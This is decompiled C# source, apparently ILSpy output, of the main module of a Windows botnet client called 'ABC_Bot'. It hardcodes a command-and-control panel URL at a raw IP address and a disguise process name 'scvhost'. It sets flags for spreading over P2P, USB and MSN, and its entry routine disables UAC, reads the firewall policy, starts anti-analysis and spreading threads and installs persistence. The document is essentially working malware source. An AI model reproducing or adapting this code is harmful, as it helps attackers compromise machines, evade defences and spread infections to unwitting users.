using System;
using System.Diagnostics;
using System.Threading;
using ABC_Bot.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ABC_Bot;

[StandardModule]
internal sealed class main
{
	public static object windir = Environment.GetFolderPath(Environment.SpecialFolder.System);

	public static string name = "scvhost";

	public static string dir = Conversions.ToString(windir);

	public static string panel = "http://92.241.190.78:81/_02382/bot.php";

	public static int intervall = 20;

	public static bool o_p2p = true;

	public static bool o_usb = true;

	public static bool o_msn = true;

	public static bool o_rar = false;

	public static bool http = true;

	public static bool supersyn = true;

	public static bool uac = true;

	public static bool debug = false;

	private static RegistryKey RegKey;

	private static byte Ret_V;

	[STAThread]
	public static void main()
	{
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Thread thread = default(Thread);
		Thread thread2 = default(Thread);
		Thread thread3 = default(Thread);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 466:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0013;
						case 4:
						case 5:
							goto IL_001c;
						case 6:
							goto IL_0026;
						case 7:
						case 8:
							goto IL_002f;
						case 9:
							goto IL_003c;
						case 10:
							goto IL_0060;
						case 11:
							goto IL_006a;
						case 12:
							goto IL_0078;
						case 13:
							goto IL_0086;
						case 14:
							goto IL_0091;
						case 15:
						case 16:
							goto IL_00a2;
						case 17:
						case 18:
						case 19:
							goto IL_00ba;
						case 20:
							goto IL_00d0;
						case 21:
							goto IL_00da;
						case 22:
							goto IL_00e8;
						case 23:
							goto IL_00fd;
						case 24:
						case 25:
							goto IL_0107;
						case 26:
							goto IL_011d;
						case 27:
							goto IL_0127;
						case 28:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 29:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_011d:
					num = 26;
					thread.Start();
					goto IL_0127;
					IL_0107:
					num = 25;
					thread = new Thread((ThreadStart)delegate
					{
						c_cmd.intvall();
					});
					goto IL_011d;
					IL_0009:
					num = 2;
					if (uac)
					{
						goto IL_0013;
					}
					goto IL_001c;
					IL_0013:
					num = 3;
					mod_uac.DisUAC();
					goto IL_001c;
					IL_001c:
					num = 5;
					if (debug)
					{
						goto IL_0026;
					}
					goto IL_002f;
					IL_0026:
					num = 6;
					mod_install.uninstall();
					goto IL_002f;
					IL_002f:
					num = 8;
					Thread.Sleep(2000);
					goto IL_003c;
					IL_003c:
					num = 9;
					Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", "EnableFirewall", (object)null));
					goto IL_0060;
					IL_0060:
					num = 10;
					Ret_V = 0;
					goto IL_006a;
					IL_006a:
					num = 11;
					RegKey.Flush();
					goto IL_0078;
					IL_0078:
					num = 12;
					RegKey.Close();
					goto IL_0086;
					IL_0086:
					num = 13;
					if (debug)
					{
						goto IL_0091;
					}
					goto IL_00a2;
					IL_0091:
					num = 14;
					Interaction.MsgBox((object)"Start", (MsgBoxStyle)0, (object)null);
					goto IL_00a2;
					IL_00a2:
					num = 16;
					if (Process.GetProcessesByName(name).Length >= 2)
					{
						ProjectData.EndApp();
					}
					goto IL_00ba;
					IL_0127:
					num = 27;
					thread2 = new Thread((ThreadStart)delegate
					{
						c_smain.startspread();
					});
					break;
					IL_00ba:
					num = 19;
					thread3 = new Thread((ThreadStart)delegate
					{
						c_anti.intervall();
					});
					goto IL_00d0;
					IL_00d0:
					num = 20;
					thread3.Start();
					goto IL_00da;
					IL_00da:
					num = 21;
					Thread.Sleep(500);
					goto IL_00e8;
					IL_00e8:
					num = 22;
					if (Conversions.ToBoolean(Operators.NotObject(mod_install.isInstalled())))
					{
						goto IL_00fd;
					}
					goto IL_0107;
					IL_00fd:
					num = 23;
					mod_install.Install();
					goto IL_0107;
					end_IL_0000_2:
					break;
				}
				num = 28;
				thread2.Start();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 466;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
